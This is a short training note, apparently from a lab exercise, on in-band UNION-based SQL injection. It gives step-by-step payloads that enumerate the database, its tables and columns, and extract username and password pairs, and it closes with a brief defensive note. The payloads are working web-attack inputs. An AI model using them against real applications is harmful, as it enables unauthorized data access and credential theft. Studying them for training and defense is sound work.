# In-Band SQL Injection

Used on: **SQL Injection Fundamentals**

In-band SQL injection returns extracted data in the same HTTP response used to send the payload. Error-based and UNION-based SQLi are the two common patterns: either the database error leaks structure, or `UNION SELECT` adds attacker-chosen rows to the original query output.

## Prerequisites

- A parameter reaches a SQL query without safe parameterization.
- The response reflects query output or database errors.
- The backend account can read the target tables or `information_schema`.

## Steps

### 1. Break the query

```sql
id=1'
id=1"
```

A syntax error confirms that input is affecting the SQL parser.

### 2. Find the column count

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

The first payload that returns without error gives the usable column count.

### 3. Suppress the original row

```sql
0 UNION SELECT 1,2,3
```

Using an impossible ID makes the injected row easier to see.

### 4. Identify the current database

```sql
0 UNION SELECT 1,2,database()
```

### 5. List tables

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
```

### 6. List columns

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'
```

### 7. Extract rows

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users
```

## Useful Functions and Tables

| Item | Purpose |
|------|---------|
| `database()` | Current database name |
| `group_concat()` | Joins multiple rows into one visible string |
| `information_schema.tables` | Table metadata |
| `information_schema.columns` | Column metadata |
| `UNION SELECT` | Appends attacker-selected data to the response |

## Defensive Note

Use parameterized queries, avoid reflecting raw database errors, and ensure the web application's database account has least-privilege access.